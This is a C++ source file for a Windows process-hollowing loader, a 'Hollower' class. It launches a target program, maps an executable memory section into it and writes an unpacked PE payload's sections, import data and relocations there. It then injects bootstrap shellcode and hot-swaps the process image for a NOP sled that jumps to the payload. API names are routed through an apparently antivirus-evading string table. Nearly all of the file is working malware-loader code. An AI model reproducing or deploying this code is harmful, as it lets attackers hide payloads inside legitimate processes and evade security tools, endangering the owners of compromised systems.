#include "stdafx.h"
#include "Hollower.h"
#include "Shellcode.h"
#include "Reflections.h"
#include "AVStringTable.h"
#include <Psapi.h>

#define EXE_OFFSET 0x200
#define STATUS_CONFLICTING_ADDRESSES 0xC0000018
#define TARGET_PROCESSOR 1 //used for affinity 
HANDLE hSection;

Hollower::Hollower(std::wstring targetProcPath, BYTE* unpackedExe)
{
	this->hollowedProcPath = targetProcPath;
	this->packedPEData = new PEData((IMAGE_DOS_HEADER*)(unpackedExe));
	this->hollowedPEData = new PEData(targetProcPath);
	riscySupportedProcess = false;
	if (std::find(supportedRISCYHollowers.begin(), supportedRISCYHollowers.end(), hollowedProcPath) == supportedRISCYHollowers.end())
		riscySupportedProcess = true;
	AV_stringTable *AS = new AV_stringTable();

	HMODULE hmNtdll = GetModuleHandle(AS->Ntdll.c_str());

	this->NtUnmapViewOfSection = (TNtUnmapViewOfSection) GetProcAddress(hmNtdll, AS->NtUnmapViewOfSection.c_str());
	this->NtMapViewOfSection = (TNtMapViewOfSection)GetProcAddress(hmNtdll,AS->NtMapViewOfSection.c_str());
	this->NtCreateSection = (TNtCreateSection)GetProcAddress(hmNtdll,AS->NtCreateSection.c_str());
	this->NtQueryInformationProcess = (TNtQueryInformationProcess)GetProcAddress(hmNtdll, AS->NtQueryProrcessInformation.c_str());
	this->containsStringSize = GetFunctionSize(ContainsString);
	this->IATshellcodeSize = GetFunctionSize(IATshellcode);

	this->imageOffset = (void*)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint + this->IATshellcodeSize + 0x100);
	this->remoteNopBase = (void*)this->hollowedPEData->GetOptionalHeader()->ImageBase;
	this->remoteCodeBase = NULL;
}

void Hollower::UnmapAtAddress(HANDLE proc, void* remoteAddr)
{ 
	this->NtUnmapViewOfSection(this->hRemoteProc, remoteAddr);
}

bool Hollower::MapAtAddress(HANDLE proc, HANDLE hSection, void* &remoteAddr)
{
	LARGE_INTEGER sMaxSize = { 0, 0 };

	SIZE_T vSize = 0;
	NTSTATUS status = this->NtMapViewOfSection(hSection, proc, &remoteAddr, NULL, NULL, NULL, &vSize, 2, NULL, PAGE_EXECUTE_READWRITE);

	if (!status)
		return false;
	return true;
}

void Hollower::WriteSections()
{
	std::vector<SectionInfo> sections = this->packedPEData->GetSections();

	for (std::vector<SectionInfo>::iterator it = sections.begin(); it != sections.end(); ++it)
	{
		memcpy((void*)((int)this->localCodeSectionBase + (int)this->imageOffset + (int)it->_vOffset),
			(void*)((int)this->packedPEData->GetModuleBase() + it->_rOffset), it->_vSize);
	}
}

size_t Hollower::SerializeIATInfo()
{
	/*
	* SerializedIAT State Maching
	* ---------------------
	* NULL - delimit function
	* NULL, NULL - delimit library (string after is always library name)
	* NULL, NULL, NULL - end of IAT info
	*/

	IAT iat = this->packedPEData->GetIAT();
	//lead with two nulls
	char* sectionPos = (char*)this->localCodeSectionBase+2;

	for (std::vector<Thunk>::iterator it = iat.thunks.begin(); it != iat.thunks.end(); ++it)
	{
		memcpy(sectionPos, it->libname.c_str(), it->libname.length());
		sectionPos += it->libname.length()+1;
		for (std::vector<std::string>::iterator itf = it->functionNames.begin(); itf != it->functionNames.end(); ++itf)
		{
			memcpy(sectionPos, itf->c_str(), itf->length());
			sectionPos += itf->length()+1;
		}
		//add extra NULL for lib delimeter
		sectionPos++;
	}
	return (size_t)((int)sectionPos - (int)this->localCodeSectionBase)+2;
}

void Hollower::InjectBootstrapper(size_t IATInfoOffset)
{

	AV_stringTable *AS = new AV_stringTable();
	int ContainsStringAddr = (int)this->localCodeSectionBase + IATInfoOffset;

	//copy ContainsString Function
	memcpy((void*)ContainsStringAddr, ContainsString, containsStringSize);

	int kernel32Str = ContainsStringAddr + containsStringSize + 0x20;
	//copy string table for shellcode
	lstrcpyW((wchar_t*)kernel32Str, AS->Kernel32.c_str());

	int loadlibraryStr = kernel32Str + 0x20;
	strcpy_s((char*)loadlibraryStr, 13, AS->LoadLibraryA.c_str());

	int getProcAddrStr = loadlibraryStr + 0x20;
	strcpy_s((char*)getProcAddrStr, 15, AS->GetProcAddress.c_str());

	IATBootstrapLocalEP = (void*)((int)this->localCodeSectionBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint));

	//copy IATShellcode
	memcpy((void*)IATBootstrapLocalEP, IATshellcode, this->IATshellcodeSize);

	//Apply shellcode settings
	FindReplaceMemory(IATBootstrapLocalEP,
		(size_t)this->IATshellcodeSize,
		std::map<DWORD, DWORD>({
								{ SECTION_BASE_PLACEHOLDER, (DWORD)this->remoteCodeBase },
								{ IAT_LOCATION_PLACEHOLDER, (DWORD)this->remoteCodeBase + (DWORD)this->packedPEData->GetIAT().offset + (DWORD)this->imageOffset},
								{ CONTAINS_STRING_PLACEHOLDER, (DWORD)this->remoteCodeBase + IATInfoOffset },
								{ KERNEL32_PLACEHOLDER, (DWORD)this->remoteCodeBase + (kernel32Str - (int)this->localCodeSectionBase) },
								{ LOADLIBRARY_PLACEHOLDER,(DWORD)this->remoteCodeBase + (loadlibraryStr - (int)this->localCodeSectionBase)},
								{ GETPROCADDRESS_PLACEHOLDER,(DWORD)this->remoteCodeBase + (getProcAddrStr - (int)this->localCodeSectionBase)},
								{ OEP_PLACEHOLDER, ((DWORD)this->remoteCodeBase) + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() },
								{ RET_INT3_INT3_INT3, PUSH | PUSH_PLACEHOLDER}
								}));

	FindReplaceMemory(IATBootstrapLocalEP,
		(size_t)this->IATshellcodeSize,
		std::map<DWORD, DWORD>({
							{ PUSH_PLACEHOLDER >> 8, (DWORD)this->remoteCodeBase + (DWORD)this->imageOffset + this->packedPEData->GetEntryPoint() } //Push OEP before RET
	}));

	*(DWORD*)((int)IATBootstrapLocalEP + (int)this->IATshellcodeSize + 1) = RET_INT3_INT3_INT3;
	
	FixRelocations();
}

void Hollower::FixRelocations()
{
	if (((int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress)== 0)
		return;
	IMAGE_BASE_RELOCATION* relocationDirectory = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	int relocationSize = (int)this->packedPEData->GetOptionalHeader()->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
	int relPos = 0;
	
	while (relPos < relocationSize)
	{
		DWORD majorOffset = ((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->VirtualAddress;
		size_t blockSize = (DWORD)((IMAGE_BASE_RELOCATION*)((int)relocationDirectory + relPos))->SizeOfBlock;
	
		DWORD block = (DWORD)((int)relocationDirectory + relPos)+8;
		while(*(WORD*)block!=0)
		{
			WORD minorOffset = (*(WORD*)block & 0xfff);

			void* addrToBePatched = (IMAGE_BASE_RELOCATION*)((int)this->localCodeSectionBase + (int)this->imageOffset + majorOffset + minorOffset);
			*(DWORD*)addrToBePatched = (DWORD)(((*(int*)addrToBePatched)
				- (int)this->packedPEData->GetOptionalHeader()->ImageBase)
				+ (int)this->remoteCodeBase) 
				+ (int)this->imageOffset;
			block+=2;
		}
		relPos += blockSize;
	}
}

HANDLE Hollower::CreateSectionBuffer(void* &base, SIZE_T size)
{
	HANDLE hSection;
	LARGE_INTEGER sMaxSize;
	sMaxSize.LowPart = size;
	sMaxSize.HighPart = 0;

	NTSTATUS status = this->NtCreateSection(&hSection, SECTION_MAP_EXECUTE | 
													   SECTION_MAP_READ | 
		                                               SECTION_MAP_WRITE, NULL, &sMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
	status = this->NtMapViewOfSection(hSection, HANDLE(0xffffffff), &base, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READWRITE);
	return hSection;
}

DWORD WINAPI Hollower::MemHotswap(LPVOID lpParam)
{
	DWORD tid;
	Hollower* context = (Hollower*)lpParam;
	context->UnmapAtAddress(context->hRemoteProc, (void*)context->remoteNopBase);
	context->MapAtAddress(context->hRemoteProc, context->hNopSection, context->remoteNopBase);
	return 0;
}

void Hollower::SwapMemory()
{
	DWORD tid;
	const size_t MAP_SIZE = this->hollowedPEData->GetOptionalHeader()->SizeOfImage;
	this->hNopSection = CreateSectionBuffer(this->localNopSectionBase, MAP_SIZE);
	memset((void*)((int)this->localNopSectionBase), NOP, MAP_SIZE); //Build NOP sled

	long long int push = 0x000000000068;
	long long int ret = 0xc30000000000;
	long long int ret2OEP = 0;
	IATBootstrapRemoteEP = (void*)((int)(int)this->remoteCodeBase + (int)(this->hollowedPEData->GetOptionalHeader()->AddressOfEntryPoint));
	long long int epAddr = (long long int)IATBootstrapRemoteEP;
	ret2OEP = push | epAddr << 0x8 | ret; // PUSH ShellCodeEntryPoint; 
										  // RET

	*(long long int*)((BYTE*)this->localNopSectionBase + (MAP_SIZE - 0x10)) = ret2OEP; //End NOP sled with push/ret

	HANDLE hThread = CreateThread(NULL, 0, MemHotswap, this, 0, &tid);

	SetThreadAffinityMask(hThread, TARGET_PROCESSOR);
	SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);

	WaitForSingleObject(hThread, INFINITE);
}

void* Hollower::GetRemoteImageBase()
{
	size_t size = sizeof(HMODULE); //only get first loaded module (which is image base)
	DWORD sizeNeeded;
	HMODULE* modules = (HMODULE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
	EnumProcessModules(this->hRemoteProc, modules, size, &sizeNeeded);

	return (void*)*modules;
}

HANDLE Hollower::DoHollow()
{
	size_t secSize = this->packedPEData->GetOptionalHeader()->SizeOfImage > this->hollowedPEData->GetOptionalHeader()->SizeOfImage
		? this->packedPEData->GetOptionalHeader()->SizeOfImage + IATshellcodeSize + 0x500
		: this->hollowedPEData->GetOptionalHeader()->SizeOfImage + IATshellcodeSize + 0x500;

	HANDLE hSection = CreateSectionBuffer(this->localCodeSectionBase, secSize);
	if(!StartRemoteProcess())
		return NULL;
	this->remoteNopBase = GetRemoteImageBase();
	MapAtAddress(this->hRemoteProc, hSection, this->remoteCodeBase);
	WriteSections();
	size_t IATInfoOffset = SerializeIATInfo();
	//Write IAT stub which will process serialized IAT info
	InjectBootstrapper(IATInfoOffset);

	SwapMemory();

//	if (!riscySupportedProcess)
//		ResumeThread(this->hRemoteThread);
	return this->hRemoteProc;
}


bool Hollower::StartRemoteProcess()
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	memset(&si, 0, sizeof(si));
	bool suspendRequired = false;
	si.cb = sizeof(STARTUPINFO);
	wchar_t app[MAX_PATH] = {};
	
	std::copy(hollowedProcPath.begin(), hollowedProcPath.end(), app);
	
//	si.dwFlags = STARTF_USESHOWWINDOW;
//	si.wShowWindow = false;
	CreateProcess(app, NULL , NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	//if (!riscySupportedProcess)
	//	SuspendThread(pi.hProcess);
	this->hRemoteProc = pi.hProcess;
	this->hRemoteThread = pi.hThread;

	SetPriorityClass(this->hRemoteProc, IDLE_PRIORITY_CLASS);
	SetThreadPriority(this->hRemoteThread, THREAD_PRIORITY_IDLE);
	SetThreadAffinityMask(this->hRemoteThread, TARGET_PROCESSOR);
	SetProcessPriorityBoost(this->hRemoteProc, true);

	WaitForSingleObject(this->hRemoteProc, 1000);
	if (WAIT_OBJECT_0)
		return false;
	return true;
}

Hollower::~Hollower()
{

}

